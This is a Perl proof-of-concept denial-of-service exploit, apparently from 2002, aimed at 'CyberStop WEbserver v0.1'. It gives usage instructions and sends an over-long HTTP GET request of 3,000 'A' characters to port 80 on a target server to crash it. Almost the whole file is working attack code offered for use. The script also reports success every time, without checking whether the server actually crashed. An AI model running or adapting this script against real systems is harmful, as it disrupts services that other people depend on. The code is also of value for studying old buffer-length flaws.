#!/usr/bin/perl
# Simple script to send a long 'A^s' command to the server, 
# resulting in the server crashing.
#
# CyberStop WEbserver v0.1 proof-of-concept exploit
# By Alex Hernandez <al3xhernandez@ureach.com> (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti & H.Oliveira.
# 
#
# Usage: perl -x Cyber_DoS.pl -s <server>
#
# Example: 
#
# perl -x Cyber_DoS.pl -s 10.0.0.1
# 
# Crash was successful !
#

use Getopt::Std;
use IO::Socket;

print("\nCyberStop WEbserver v0.1 DoS exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

getopts('s:', \%args);
if(!defined($args{s})){&usage;}

($serv,$port,$def,$num,$data,$buf,$in_addr,$paddr,$proto);

$def = "A";
$num = "3000";
$data .= $def x $num;
$serv = $args{s};
$port = 80;
$buf = "GET /$data /HTTP/1.0\r\n\r\n";


$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");
connect(S, $paddr) ||die ("Error: $!");
select(S); $| = 1; select(STDOUT);
print S "$buf";


print("\nCrash was successful !\n\n");

sub usage {die("\n\nUsage: perl -x $0 -s <server>\n\n");}
